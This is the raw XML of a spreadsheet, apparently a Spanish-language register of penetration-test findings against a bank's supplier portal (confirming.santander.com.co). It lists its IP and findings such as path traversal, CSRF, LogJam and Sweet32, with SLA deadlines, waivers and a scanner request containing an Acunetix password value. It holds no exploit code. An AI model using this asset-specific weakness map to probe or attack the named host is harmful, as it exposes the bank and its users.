  <c r="U238" i="1"/>
  <c r="W238" i="1" s="1"/>
  <c r="U239" i="1"/>
  <c r="W239" i="1" s="1"/>
  <c r="U228" i="1"/>
  <c r="W228" i="1" s="1"/>
  <c r="U229" i="1"/>
  <c r="W229" i="1" s="1"/>
  <c r="U227" i="1"/>
  <c r="W227" i="1" s="1"/>
  <c r="U226" i="1"/>
  <c r="W226" i="1" s="1"/>
  <c r="U221" i="1"/>
  <c r="W221" i="1" s="1"/>
  <c r="U222" i="1"/>
  <c r="W222" i="1" s="1"/>
  <c r="U223" i="1"/>
  <c r="W223" i="1" s="1"/>
  <c r="U224" i="1"/>
  <c r="W224" i="1" s="1"/>
  <c r="U225" i="1"/>
  <c r="W225" i="1" s="1"/>
  <c r="U220" i="1"/>
  <c r="W220" i="1" s="1"/>
  <c r="U219" i="1" l="1"/>
  <c r="W219" i="1" s="1"/>
  <c r="U218" i="1"/>
  <c r="W218" i="1" s="1"/>
  <c r="U217" i="1"/>
  <c r="W217" i="1" s="1"/>
  <c r="U216" i="1"/>
  <c r="W216" i="1" s="1"/>
  <c r="U215" i="1"/>
  <c r="W215" i="1" s="1"/>
  <c r="U214" i="1"/>
  <c r="W214" i="1" s="1"/>
  <c r="U210" i="1"/>
  <c r="W210" i="1" s="1"/>
  <c r="U211" i="1"/>
  <c r="W211" i="1" s="1"/>
  <c r="U212" i="1"/>
  <c r="W212" i="1" s="1"/>
  <c r="U213" i="1"/>
  <c r="W213" i="1" s="1"/>
  <c r="U209" i="1"/>
  <c r="W209" i="1" s="1"/>
  <c r="U205" i="1"/>
  <c r="W205" i="1" s="1"/>
  <c r="U206" i="1"/>
  <c r="W206" i="1" s="1"/>
  <c r="U207" i="1"/>
  <c r="W207" i="1" s="1"/>
  <c r="U208" i="1"/>
  <c r="W208" i="1" s="1"/>
  <c r="U204" i="1"/>
  <c r="W204" i="1" s="1"/>
  <c r="U202" i="1"/>
  <c r="W202" i="1" s="1"/>
  <c r="U203" i="1"/>
  <c r="W203" i="1" s="1"/>
  <c r="U201" i="1"/>
  <c r="W201" i="1" s="1"/>
  <c r="U199" i="1"/>
  <c r="W199" i="1" s="1"/>
  <c r="U200" i="1"/>
  <c r="W200" i="1" s="1"/>
  <c r="U198" i="1"/>
  <c r="W198" i="1" s="1"/>
  <c r="U197" i="1"/>
  <c r="W197" i="1" s="1"/>
  <c r="U196" i="1"/>
  <c r="W196" i="1" s="1"/>
  <c r="U195" i="1"/>
  <c r="W195" i="1" s="1"/>
  <c r="U194" i="1" l="1"/>
  <c r="W194" i="1" s="1"/>
  <c r="U190" i="1"/>
  <c r="W190" i="1" s="1"/>
  <c r="U191" i="1"/>
  <c r="W191" i="1" s="1"/>
  <c r="U192" i="1"/>
  <c r="W192" i="1" s="1"/>
  <c r="U193" i="1"/>
  <c r="W193" i="1" s="1"/>
  <c r="U189" i="1"/>
  <c r="W189" i="1" s="1"/>
  <c r="U188" i="1"/>
  <c r="W188" i="1" s="1"/>
  <c r="U187" i="1"/>
  <c r="W187" i="1" s="1"/>
  <c r="U186" i="1"/>
  <c r="W186" i="1" s="1"/>
  <c r="U185" i="1"/>
  <c r="W185" i="1" s="1"/>
  <c r="U184" i="1" l="1"/>
  <c r="W184" i="1" s="1"/>
  <c r="U183" i="1"/>
  <c r="W183" i="1" s="1"/>
  <c r="U181" i="1"/>
  <c r="W181" i="1" s="1"/>
  <c r="U182" i="1"/>
  <c r="W182" i="1" s="1"/>
  <c r="U180" i="1"/>
  <c r="W180" i="1" s="1"/>
  <c r="U179" i="1"/>
  <c r="W179" i="1" s="1"/>
  <c r="U178" i="1"/>
  <c r="W178" i="1" s="1"/>
  <c r="U177" i="1"/>
  <c r="W177" i="1" s="1"/>
  <c r="U176" i="1"/>
  <c r="W176" i="1" s="1"/>
  <c r="U175" i="1"/>
  <c r="W175" i="1" s="1"/>
  <c r="U174" i="1"/>
  <c r="W174" i="1" s="1"/>
  <c r="U173" i="1" l="1"/>
  <c r="W173" i="1" s="1"/>
  <c r="U172" i="1"/>
  <c r="W172" i="1" s="1"/>
  <c r="U169" i="1"/>
  <c r="W169" i="1" s="1"/>
  <c r="U170" i="1"/>
  <c r="W170" i="1" s="1"/>
  <c r="U171" i="1"/>
  <c r="W171" i="1" s="1"/>
  <c r="U168" i="1"/>
  <c r="W168" i="1" s="1"/>
  <c r="U167" i="1" l="1"/>
  <c r="W167" i="1" s="1"/>
  <c r="U166" i="1"/>
  <c r="W166" i="1" s="1"/>
  <c r="U165" i="1" l="1"/>
  <c r="W165" i="1" s="1"/>
  <c r="U164" i="1" l="1"/>
  <c r="W164" i="1" s="1"/>
  <c r="U163" i="1" l="1"/>
  <c r="W163" i="1" s="1"/>
  <c r="U162" i="1" l="1"/>
  <c r="W162" i="1" s="1"/>
  <c r="U161" i="1" l="1"/>
  <c r="W161" i="1" s="1"/>
  <c r="U160" i="1"/>
  <c r="W160" i="1" s="1"/>
  <c r="U155" i="1" l="1"/>
  <c r="W155" i="1" s="1"/>
  <c r="U156" i="1"/>
  <c r="W156" i="1" s="1"/>
  <c r="U157" i="1"/>
  <c r="W157" i="1" s="1"/>
  <c r="U158" i="1"/>
  <c r="W158" i="1" s="1"/>
  <c r="U159" i="1"/>
  <c r="W159" i="1" s="1"/>
  <c r="U154" i="1"/>
  <c r="W154" i="1" s="1"/>
  <c r="U150" i="1" l="1"/>
  <c r="W150" i="1" s="1"/>
  <c r="U151" i="1"/>
  <c r="W151" i="1" s="1"/>
  <c r="U152" i="1"/>
  <c r="W152" i="1" s="1"/>
  <c r="U153" i="1"/>
  <c r="W153" i="1" s="1"/>
  <c r="U149" i="1"/>
  <c r="W149" i="1" s="1"/>
  <c r="U148" i="1" l="1"/>
  <c r="W148" i="1" s="1"/>
  <c r="U147" i="1" l="1"/>
  <c r="W147" i="1" s="1"/>
  <c r="U145" i="1" l="1"/>
  <c r="W145" i="1" s="1"/>
  <c r="U146" i="1"/>
  <c r="W146" i="1" s="1"/>
  <c r="U144" i="1" l="1"/>
  <c r="W144" i="1" s="1"/>
  <c r="U143" i="1"/>
  <c r="W143" i="1" s="1"/>
  <c r="U142" i="1"/>
  <c r="W142" i="1" s="1"/>
  <c r="U133" i="1" l="1"/>
  <c r="W133" i="1" s="1"/>
  <c r="U134" i="1"/>
  <c r="W134" i="1" s="1"/>
  <c r="U135" i="1"/>
  <c r="W135" i="1" s="1"/>
  <c r="U136" i="1"/>
  <c r="W136" i="1" s="1"/>
  <c r="U137" i="1"/>
  <c r="W137" i="1" s="1"/>
  <c r="U138" i="1"/>
  <c r="W138" i="1" s="1"/>
  <c r="U139" i="1"/>
  <c r="W139" i="1" s="1"/>
  <c r="U140" i="1"/>
  <c r="W140" i="1" s="1"/>
  <c r="U141" i="1"/>
  <c r="W141" i="1" s="1"/>
  <c r="U132" i="1"/>
  <c r="W132" i="1" s="1"/>
  <c r="U131" i="1" l="1"/>
  <c r="W131" i="1" s="1"/>
  <c r="U130" i="1"/>
  <c r="W130" i="1" s="1"/>
  <c r="U124" i="1" l="1"/>
  <c r="W124" i="1" s="1"/>
  <c r="U125" i="1"/>
  <c r="W125" i="1" s="1"/>
  <c r="U126" i="1"/>
  <c r="W126" i="1" s="1"/>
  <c r="U127" i="1"/>
  <c r="W127" i="1" s="1"/>
  <c r="U128" i="1"/>
  <c r="W128" i="1" s="1"/>
  <c r="U129" i="1"/>
  <c r="W129" i="1" s="1"/>
  <c r="U123" i="1"/>
  <c r="W123" i="1" s="1"/>
  <c r="U119" i="1" l="1"/>
  <c r="W119" i="1" s="1"/>
  <c r="U120" i="1"/>
  <c r="W120" i="1" s="1"/>
  <c r="U121" i="1"/>
  <c r="W121" i="1" s="1"/>
  <c r="U122" i="1"/>
  <c r="W122" i="1" s="1"/>
  <c r="U118" i="1" l="1"/>
  <c r="W118" i="1" s="1"/>
  <c r="U117" i="1" l="1"/>
  <c r="W117" i="1" s="1"/>
  <c r="U116" i="1"/>
  <c r="W116" i="1" s="1"/>
  <c r="U115" i="1"/>
  <c r="W115" i="1" s="1"/>
  <c r="U114" i="1" l="1"/>
  <c r="W114" i="1" s="1"/>
  <c r="U110" i="1" l="1"/>
  <c r="W110" i="1" s="1"/>
  <c r="U111" i="1"/>
  <c r="W111" i="1" s="1"/>
  <c r="U112" i="1"/>
  <c r="W112" i="1" s="1"/>
  <c r="U113" i="1"/>
  <c r="W113" i="1" s="1"/>
  <c r="U109" i="1"/>
  <c r="W109" i="1" s="1"/>
  <c r="U106" i="1" l="1"/>
  <c r="W106" i="1" s="1"/>
  <c r="U107" i="1"/>
  <c r="W107" i="1" s="1"/>
  <c r="U108" i="1"/>
  <c r="W108" i="1" s="1"/>
  <c r="U16" i="1" l="1"/>
  <c r="W16" i="1" s="1"/>
  <c r="U102" i="1" l="1"/>
  <c r="W102" i="1" s="1"/>
  <c r="U103" i="1"/>
  <c r="W103" i="1" s="1"/>
  <c r="U104" i="1"/>
  <c r="W104" i="1" s="1"/>
  <c r="U105" i="1"/>
  <c r="W105" i="1" s="1"/>
  <c r="U101" i="1" l="1"/>
  <c r="W101" i="1" s="1"/>
  <c r="U2" i="1" l="1"/>
  <c r="W2" i="1" s="1"/>
  <c r="U3" i="1"/>
  <c r="W3" i="1" s="1"/>
  <c r="U4" i="1"/>
  <c r="W4" i="1" s="1"/>
  <c r="U5" i="1"/>
  <c r="W5" i="1" s="1"/>
  <c r="U6" i="1"/>
  <c r="W6" i="1" s="1"/>
  <c r="U7" i="1"/>
  <c r="W7" i="1" s="1"/>
  <c r="U8" i="1"/>
  <c r="W8" i="1" s="1"/>
  <c r="U9" i="1"/>
  <c r="W9" i="1" s="1"/>
  <c r="U10" i="1"/>
  <c r="W10" i="1" s="1"/>
  <c r="U11" i="1"/>
  <c r="W11" i="1" s="1"/>
  <c r="U12" i="1"/>
  <c r="W12" i="1" s="1"/>
  <c r="U13" i="1"/>
  <c r="W13" i="1" s="1"/>
  <c r="U14" i="1"/>
  <c r="W14" i="1" s="1"/>
  <c r="U15" i="1"/>
  <c r="W15" i="1" s="1"/>
  <c r="U17" i="1"/>
  <c r="W17" i="1" s="1"/>
  <c r="U18" i="1"/>
  <c r="W18" i="1" s="1"/>
  <c r="U19" i="1"/>
  <c r="W19" i="1" s="1"/>
  <c r="U20" i="1"/>
  <c r="W20" i="1" s="1"/>
  <c r="U21" i="1"/>
  <c r="W21" i="1" s="1"/>
  <c r="U22" i="1"/>
  <c r="W22" i="1" s="1"/>
  <c r="U23" i="1"/>
  <c r="W23" i="1" s="1"/>
  <c r="U24" i="1"/>
  <c r="W24" i="1" s="1"/>
  <c r="U25" i="1"/>
  <c r="W25" i="1" s="1"/>
  <c r="U26" i="1"/>
  <c r="W26" i="1" s="1"/>
  <c r="U27" i="1"/>
  <c r="W27" i="1" s="1"/>
  <c r="U28" i="1"/>
  <c r="W28" i="1" s="1"/>
  <c r="U29" i="1"/>
  <c r="W29" i="1" s="1"/>
  <c r="U30" i="1"/>
  <c r="W30" i="1" s="1"/>
  <c r="U31" i="1"/>
  <c r="W31" i="1" s="1"/>
  <c r="U32" i="1"/>
  <c r="W32" i="1" s="1"/>
  <c r="U33" i="1"/>
  <c r="W33" i="1" s="1"/>
  <c r="U34" i="1"/>
  <c r="W34" i="1" s="1"/>
  <c r="U35" i="1"/>
  <c r="W35" i="1" s="1"/>
  <c r="U36" i="1"/>
  <c r="W36" i="1" s="1"/>
  <c r="U37" i="1"/>
  <c r="W37" i="1" s="1"/>
  <c r="U38" i="1"/>
  <c r="W38" i="1" s="1"/>
  <c r="U39" i="1"/>
  <c r="W39" i="1" s="1"/>
  <c r="U40" i="1"/>
  <c r="W40" i="1" s="1"/>
  <c r="U41" i="1"/>
  <c r="W41" i="1" s="1"/>
  <c r="U42" i="1"/>
  <c r="W42" i="1" s="1"/>
  <c r="U43" i="1"/>
  <c r="W43" i="1" s="1"/>
  <c r="U44" i="1"/>
  <c r="W44" i="1" s="1"/>
  <c r="U45" i="1"/>
  <c r="W45" i="1" s="1"/>
  <c r="U46" i="1"/>
  <c r="W46" i="1" s="1"/>
  <c r="U47" i="1"/>
  <c r="W47" i="1" s="1"/>
  <c r="U48" i="1"/>
  <c r="W48" i="1" s="1"/>
  <c r="U49" i="1"/>
  <c r="W49" i="1" s="1"/>
  <c r="U50" i="1"/>
  <c r="W50" i="1" s="1"/>
  <c r="U51" i="1"/>
  <c r="W51" i="1" s="1"/>
  <c r="U52" i="1"/>
  <c r="W52" i="1" s="1"/>
  <c r="U53" i="1"/>
  <c r="W53" i="1" s="1"/>
  <c r="U54" i="1"/>
  <c r="W54" i="1" s="1"/>
  <c r="U55" i="1"/>
  <c r="W55" i="1" s="1"/>
  <c r="U56" i="1"/>
  <c r="W56" i="1" s="1"/>
  <c r="U57" i="1"/>
  <c r="W57" i="1" s="1"/>
  <c r="U58" i="1"/>
  <c r="W58" i="1" s="1"/>
  <c r="U59" i="1"/>
  <c r="W59" i="1" s="1"/>
  <c r="U60" i="1"/>
  <c r="W60" i="1" s="1"/>
  <c r="U61" i="1"/>
  <c r="W61" i="1" s="1"/>
  <c r="U62" i="1"/>
  <c r="W62" i="1" s="1"/>
  <c r="U63" i="1"/>
  <c r="W63" i="1" s="1"/>
  <c r="U64" i="1"/>
  <c r="W64" i="1" s="1"/>
  <c r="U65" i="1"/>
  <c r="W65" i="1" s="1"/>
  <c r="U66" i="1"/>
  <c r="W66" i="1" s="1"/>
  <c r="U67" i="1"/>
  <c r="W67" i="1" s="1"/>
  <c r="U68" i="1"/>
  <c r="W68" i="1" s="1"/>
  <c r="U69" i="1"/>
  <c r="W69" i="1" s="1"/>
  <c r="U70" i="1"/>
  <c r="W70" i="1" s="1"/>
  <c r="U71" i="1"/>
  <c r="W71" i="1" s="1"/>
  <c r="U72" i="1"/>
  <c r="W72" i="1" s="1"/>
  <c r="U73" i="1"/>
  <c r="W73" i="1" s="1"/>
  <c r="U74" i="1"/>
  <c r="W74" i="1" s="1"/>
  <c r="U75" i="1"/>
  <c r="W75" i="1" s="1"/>
  <c r="U76" i="1"/>
  <c r="W76" i="1" s="1"/>
  <c r="U77" i="1"/>
  <c r="W77" i="1" s="1"/>
  <c r="U78" i="1"/>
  <c r="W78" i="1" s="1"/>
  <c r="U79" i="1"/>
  <c r="W79" i="1" s="1"/>
  <c r="U80" i="1"/>
  <c r="W80" i="1" s="1"/>
  <c r="U81" i="1"/>
  <c r="W81" i="1" s="1"/>
  <c r="U82" i="1"/>
  <c r="W82" i="1" s="1"/>
  <c r="U83" i="1"/>
  <c r="W83" i="1" s="1"/>
  <c r="U84" i="1"/>
  <c r="W84" i="1" s="1"/>
  <c r="U85" i="1"/>
  <c r="W85" i="1" s="1"/>
  <c r="U86" i="1"/>
  <c r="W86" i="1" s="1"/>
  <c r="U87" i="1"/>
  <c r="W87" i="1" s="1"/>
  <c r="U88" i="1"/>
  <c r="W88" i="1" s="1"/>
  <c r="U89" i="1"/>
  <c r="W89" i="1" s="1"/>
  <c r="U90" i="1"/>
  <c r="W90" i="1" s="1"/>
  <c r="U91" i="1"/>
  <c r="W91" i="1" s="1"/>
  <c r="U92" i="1"/>
  <c r="W92" i="1" s="1"/>
  <c r="U93" i="1"/>
  <c r="W93" i="1" s="1"/>
  <c r="U94" i="1"/>
  <c r="W94" i="1" s="1"/>
  <c r="U95" i="1"/>
  <c r="W95" i="1" s="1"/>
  <c r="U96" i="1"/>
  <c r="W96" i="1" s="1"/>
  <c r="U97" i="1"/>
  <c r="W97" i="1" s="1"/>
  <c r="U98" i="1"/>
  <c r="W98" i="1" s="1"/>
  <c r="U99" i="1"/>
  <c r="W99" i="1" s="1"/>
  <c r="U100" i="1"/>
  <c r="W10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x328639</author>
  </authors>
  <commentList>
    <comment ref="X1" authorId="0" shapeId="0" xr:uid="{A36E23DE-42FA-4017-ABD5-E6CC236CE6FE}">
      <text>
        <r>
          <rPr>
            <b/>
            <sz val="9"/>
            <color indexed="81"/>
            <rFont val="Tahoma"/>
            <family val="2"/>
          </rPr>
          <t>Fecha final de remediación basado en el SLA:
(Emergencia: 10 días, Critica: 30 días, Medio: 90 días, Bajo 120 días)
NOTA: vencido el SLA se debe validar si aplica Waiver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x328639</author>
  </authors>
  <commentList>
    <comment ref="X1" authorId="0" shapeId="0" xr:uid="{00000000-0006-0000-0100-000001000000}">
      <text>
        <r>
          <rPr>
            <b/>
            <sz val="9"/>
            <color indexed="81"/>
            <rFont val="Tahoma"/>
            <family val="2"/>
          </rPr>
          <t>Fecha final de remediación basado en el SLA:
(Emergencia: 10 días, Critica: 30 días, Medio: 90 días, Bajo 120 días)
NOTA: vencido el SLA se debe validar si aplica Waiver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x328639</author>
  </authors>
  <commentList>
    <comment ref="X1" authorId="0" shapeId="0" xr:uid="{72ADADFF-04FA-45AC-8F34-9BF0027C9302}">
      <text>
        <r>
          <rPr>
            <b/>
            <sz val="9"/>
            <color indexed="81"/>
            <rFont val="Tahoma"/>
            <family val="2"/>
          </rPr>
          <t>Fecha final de remediación basado en el SLA:
(Emergencia: 10 días, Critica: 30 días, Medio: 90 días, Bajo 120 días)
NOTA: vencido el SLA se debe validar si aplica Waiver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x328639</author>
  </authors>
  <commentList>
    <comment ref="B24" authorId="0" shapeId="0" xr:uid="{00000000-0006-0000-0200-000001000000}">
      <text>
        <r>
          <rPr>
            <b/>
            <sz val="9"/>
            <color indexed="81"/>
            <rFont val="Tahoma"/>
            <family val="2"/>
          </rPr>
          <t>Fecha final de remediación basado en el SLA:
(Emergencia: 10 días, Critica: 30 días, Medio: 90 días, Bajo 120 días)
NOTA: vencido el SLA se debe validar si aplica Waiver</t>
        </r>
      </text>
    </comment>
  </commentList>
</comments>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="23430" uniqueCount="3832">
  <si>
    <t>#</t>
  </si>
  <si>
    <t>Company</t>
  </si>
  <si>
    <t>Source</t>
  </si>
  <si>
    <t>Type</t>
  </si>
  <si>
    <t>Waiver Code</t>
  </si>
  <si>
    <t>Previous Waiver code</t>
  </si>
  <si>
    <t>Name of vulnerable asset</t>
  </si>
  <si>
    <t>Internal Identification Code</t>
  </si>
  <si>
    <t>Identification Code External</t>
  </si>
  <si>
    <t>CWE Category</t>
  </si>
  <si>
    <t>State</t>
  </si>
  <si>
    <t>Criticity</t>
  </si>
  <si>
    <t>CVSS / Vendor Severity</t>
  </si>
  <si>
    <t>Code CVE
(Common Vulnerabilities and Exposures)</t>
  </si>
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Port Type</t>
  </si>
  <si>
    <t>Reported Date</t>
  </si>
  <si>
    <t>Days that reported</t>
  </si>
  <si>
    <t>Expiration day according to SLA</t>
  </si>
  <si>
    <t>SLA State</t>
  </si>
  <si>
    <t>Waiver</t>
  </si>
  <si>
    <t>Date of application for Waiver</t>
  </si>
  <si>
    <t>End date of Waiver</t>
  </si>
  <si>
    <t>Remediation Date</t>
  </si>
  <si>
    <t>Details</t>
  </si>
  <si>
    <t>Recommendation</t>
  </si>
  <si>
    <t>Risks Derived</t>
  </si>
  <si>
    <t>Date of attention</t>
  </si>
  <si>
    <t>Commentary</t>
  </si>
  <si>
    <t>Owner</t>
  </si>
  <si>
    <t>BSNC</t>
  </si>
  <si>
    <t>Deloitte</t>
  </si>
  <si>
    <t>Wep App</t>
  </si>
  <si>
    <t>BSNC-2019-021</t>
  </si>
  <si>
    <t>BSNC-2019-005
BSNC-2019-007</t>
  </si>
  <si>
    <t>Web de Proveedores</t>
  </si>
  <si>
    <t>MAN-b00ec668</t>
  </si>
  <si>
    <t>CO-001-003</t>
  </si>
  <si>
    <t>Vulnerabilidad de directorio transversal</t>
  </si>
  <si>
    <t>Dismissed</t>
  </si>
  <si>
    <t>Critical</t>
  </si>
  <si>
    <t>170.169.33.48</t>
  </si>
  <si>
    <t>confirming.santander.com.co</t>
  </si>
  <si>
    <t>1ª Fecha: 25/07/2017
2ª Fecha: 31/07/2019
3ª Fecha: 21/12/2019
4ª Fecha: 13/04/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 31/07/2019
2ª Fecha: 29/11/2019
3ª Fecha: 30/04/2020
4ª Fecha: 30/06/2020</t>
  </si>
  <si>
    <t>Un directorio transversal (o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control.</t>
  </si>
  <si>
    <t>Fue dado de baja el Lunes 13 de Julio del 2020</t>
  </si>
  <si>
    <t>BSNC-2019-022</t>
  </si>
  <si>
    <t>BSNC-2019-008</t>
  </si>
  <si>
    <t>MAN-b00ec669</t>
  </si>
  <si>
    <t>CO-005-002</t>
  </si>
  <si>
    <t>Cross Site Request Forgery</t>
  </si>
  <si>
    <t>1ª Fecha: 23/07/2019
2ª Fecha: 21/12/2019
3ª Fecha: 13/04/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 29/11/2019
2ª Fecha: 30/04/2020
3ª Fecha: 30/06/2020</t>
  </si>
  <si>
    <t>Los ataques de tipo "Cross-site Request Forgery" fuerzan a un usuario a realizar acciones no deseadas en aplicativos web, aprovechando que los usuarios legítimos se encuentran previamente autenticados en la plataforma. De esta manera, un atacante malintencionado podría confeccionar peticiones HTTP que realizasen alguna acción concreta de la aplicación, por ejemplo, cambiar la contraseña del usuario legítimo, hacer una transacción bancaria, etc. Una vez confeccionadas estas peticiones se forzaría al usuario a realizarlas, en este paso interviene un componente de ingeniería social, ya que se ha de hacer llegar al usuario un link con la acción confeccionada por el atacante para que el usuario la ejecute. Por ejemplo, simular una campaña de publicidad de la compañía via e-mail con un enlace a la acción confeccionada por el atacante. Por otro lado, para camuflar el enlace se puede esconder el mismo modificando el texto del hipervínculo, el típico "pulse aquí" o, incluso, utilizar acortadores de URL. De esta manera, cuando el usuario acceda al enlace enviado por correo electrónico se intentará ejecutar la acción deseada dentro de la sesión del usuario en la aplicación, sin que éste se de cuenta. En numerosas ocasiones, si el usuario no se encuentra previamente autenticado, al intentar realizar una acción privilegiada como cambiar la contraseña, el propio aplicativo web presentará al usuario el formulario de inicio de sesión para que éste se autentique y posteriormente realizar la acción diseñada por el atacante.</t>
  </si>
  <si>
    <t>BSNC-2019-013</t>
  </si>
  <si>
    <t>MAN-28ad454c</t>
  </si>
  <si>
    <t>CO-017-002</t>
  </si>
  <si>
    <t>Debilidad en el mecanismo de CAPTCHA</t>
  </si>
  <si>
    <t>Medium</t>
  </si>
  <si>
    <t>1ª Fecha: 21/12/2019
2ª Fecha: 13/04/2020</t>
  </si>
  <si>
    <t>1ª Fecha: 30/04/2020
2ª Fecha: 30/06/2020</t>
  </si>
  <si>
    <t>Ataque de fuerza bruta</t>
  </si>
  <si>
    <t>BSNC-2019-023</t>
  </si>
  <si>
    <t>MAN-18af2324</t>
  </si>
  <si>
    <t>CO-19-AUTO-02-CO-001</t>
  </si>
  <si>
    <t>Uso de librerias desactualizadas</t>
  </si>
  <si>
    <t>Se encuentra el uso de funciones de Modernizr 2.6.2:
/WebProveedoresNala/proveedores/js/vendor/modernizr-2.6.2.min.js</t>
  </si>
  <si>
    <t>Se recomienda utilizar versiones actualizadas del software y/o plataformas tecnológicas utilizadas, en caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada.</t>
  </si>
  <si>
    <t>El software o plataforma utilizada no se encuentra actualizado a la última versión disponible. Esto implica que podría ser susceptible de poder ser comprometido mediante vulnerabilidades conocidas que pudieran poner en riesgo el activo afectado.</t>
  </si>
  <si>
    <t>BSNC-2019-014</t>
  </si>
  <si>
    <t>MAN-28ad454d</t>
  </si>
  <si>
    <t>CO-037-001</t>
  </si>
  <si>
    <t>Revelación de información a través de SSL/TLS (BEAST)</t>
  </si>
  <si>
    <t>Existe un fallo de diseño en los protocolos SSL 3.0 y TLS 1.0 al utilizar cifrado de bloque en modo CBC. Esto podría ser utilizado por un atacante remoto para revelar información sensible a través de ataques Man in The Middle.</t>
  </si>
  <si>
    <t>BSNC-2019-012</t>
  </si>
  <si>
    <t>MAN-7446a64b</t>
  </si>
  <si>
    <t>CO-009-008</t>
  </si>
  <si>
    <t>Fuga de información de servidor y versión</t>
  </si>
  <si>
    <t>Durante la realización de las pruebas se ha detectado que en las respuestas del servidor se
muestra información sobre el tipo de servidor donde se aloja la aplicación</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la estructura interna de la misma, así como de las tecnologías utilizadas para el desarrollo de la misma o de la infraestructura que la sustenta. Este tipo de información puede ser accesible a través de las cabeceras de respuesta de la aplicación, mensajes de error y/o páginas por defecto.</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas
para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta
información podría ser utilizada por un atacante con el objetivo de recabar información para
ataques futuros.</t>
  </si>
  <si>
    <t>BSNC-2019-011</t>
  </si>
  <si>
    <t>MAN-28ad4540</t>
  </si>
  <si>
    <t>CO-004-001</t>
  </si>
  <si>
    <t>Divulgación de información httpOnly Cookie en el Servidor Apache HTTP</t>
  </si>
  <si>
    <t>La exposición de información acerca de las funcionalidades o rutas internas de la aplicación
puede implicar a un atacante obtener una mayor comprensión del sistema en uso y,
potencialmente, desarrollar más ataques para apuntar a la aplicación web.</t>
  </si>
  <si>
    <t>MAN-cc489697</t>
  </si>
  <si>
    <t>CO-19-AUTO-01-CO-001</t>
  </si>
  <si>
    <t>Uso de Software desactualizado</t>
  </si>
  <si>
    <t>Las librerias Javascript utilizadas se encuentran desactualizadas. [+]Request: GET https://confirming.santander.com.co /WebProveedoresNala/common/js/prototype.js HTTP/1.1 Pragma: no-cache Cache-Control: no-cache Referer: https://confirming.santander.com.co/WebProveedoresNala/WebPipe Acunetix-Aspect: enabled Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c Acunetix-Aspect-Queries: filelist;aspectalerts Host: confirming.santander.com.co
Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */* [+]Response: HTTP/1.1 200 OK Date: Fri, 22 Mar 2019 07:12:48 GMT Server: Apache Strict-Transport-Security: max-age=63072000; includeSubdomains; X-Frame-Options: SAMEORIGIN X-XSS-Protection: 1; mode=block Last-Modified: Tue, 14 Oct 2014 17:19:04 GMT Content-Length: 124136 Keep-Alive: timeout=10, max=185 Connection: Keep-Alive Content-Type: application/x-javascript Content-Language: en-US /* Prototype JavaScript framework, version 1.6.0 * (c) 2005-2007 Sam Stephenson * * Prototype is freely distributable under the terms of an MIT-style license. * For details, see the Prototype web site: http://www.prototypejs.org/ * *--------------------------------------------------------------------------*/</t>
  </si>
  <si>
    <t>BSNC-2019-017</t>
  </si>
  <si>
    <t>MAN-73a2e320</t>
  </si>
  <si>
    <t>CO-19-MANU-01-AP-002</t>
  </si>
  <si>
    <t>Uso de cifrado 3DES</t>
  </si>
  <si>
    <t>El activo "confirming.santander.com" permite el uso del algoritmo de cifrado 3DES</t>
  </si>
  <si>
    <t>Se recomienda deshabilitar el uso del algoritmo de cifrado 3DES y reconfigurar el servicio afectado para restringir los métodos de cifrado a aquellos que ofrezcan un nivel de seguridad alto.</t>
  </si>
  <si>
    <t>El host analizado permite el uso de cifrados SSL de seguridad media basados en el algoritmo de cifrado 3DES. Este algoritmo de cifrado es vulnerable a un ataque conocido como Sweet32. Debido a que 3DES tiene un tamaño de bloque de 64 bits, existe una alta probabilidad de que, dados los bloques 2^32, se encuentren dos bloques que colisionen. Una vez que se ha encontrado una colisión entre dos bloques en texto cifrado, se puede averiguar cómo se relacionan los bloques en texto plano correspondientes. Este conocimiento combinado con varios otros atributos permite el descifrado del texto cifrado.</t>
  </si>
  <si>
    <t>BSNC-2019-019</t>
  </si>
  <si>
    <t>MAN-73a2e322</t>
  </si>
  <si>
    <t>CO-19-MANU-01-CO-004</t>
  </si>
  <si>
    <t>Módulo SSL/TLS Diffie-Hellman &lt; = 1024 Bits (LogJam)</t>
  </si>
  <si>
    <t>El activo "confirming.santander.com.co" es vulnerable a LogJam</t>
  </si>
  <si>
    <t>Se recomienda configurar el servicio para usar un único módulo de Diffie-Hellman de 2048 bits o mayor.</t>
  </si>
  <si>
    <t>El servidor permite conexiones SSL/TLS con uno o más modulos Diffie-Hellman menor o igual a 1024 bits. A través de Criptoanálisis, un usuario malintencionado podría ser capaz de encontrar la clave compartida en un corto periodo de tiempo (dependiendo del tamaño del módulo y de los recursos del atacante). Esto podría permitir al atacante recupera la información en texto plano o violar la integridad de las conexiones.</t>
  </si>
  <si>
    <t>BSNC-2019-015</t>
  </si>
  <si>
    <t>MAN-a6e6676b</t>
  </si>
  <si>
    <t>CO-174-001</t>
  </si>
  <si>
    <t>Activo vulnerable a Lucky13 (CVE-2013-0169)</t>
  </si>
  <si>
    <t>Low</t>
  </si>
  <si>
    <t>CVE-2013-0169</t>
  </si>
  <si>
    <t>se ha detectado que el certificado del servidor (www.santander.com.co) ofrece algortimos de cifrado en modo bloque (CBC)</t>
  </si>
  <si>
    <t>Deshabilitar el uso de algoritmos cifrado de bloques (CBC) en el servidor remoto.</t>
  </si>
  <si>
    <t>El servidor usa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CVEs Asociados 
•CVE-2013-0169</t>
  </si>
  <si>
    <t>BSNC-2019-010</t>
  </si>
  <si>
    <t>MAN-647bb2ad</t>
  </si>
  <si>
    <t>CO-19-MANU-02-AP-007</t>
